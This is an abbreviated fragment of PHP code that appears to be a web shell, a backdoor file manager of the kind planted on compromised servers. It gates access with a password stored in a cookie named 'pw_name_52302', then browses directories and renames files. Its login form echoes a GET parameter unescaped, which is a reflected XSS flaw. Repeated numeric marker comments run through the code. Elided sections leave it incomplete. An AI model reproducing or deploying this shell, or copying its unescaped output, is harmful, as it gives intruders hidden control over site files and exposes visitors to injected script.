...
$pass = false;
if (isset($_COOKIE['pw_name_52302'])) {
    if(($_COOKIE['pw_name_52302']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_52302'])) {
        if(($_POST['pw_name_52302']) == $auth_key) {
            setcookie("pw_name_52302", $_POST['pw_name_52302']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_52302' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1708066059928991 1708066059143439 1708066059630964 1708066059709954
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1708066059928991 1708066059143439 1708066059630964 1708066059709954
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1708066059928991 1708066059143439 1708066059630964 1708066059709954
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1708066059928991 1708066059143439 1708066059630964 1708066059709954
            $name = PATH . "/" . $_GET['r'];
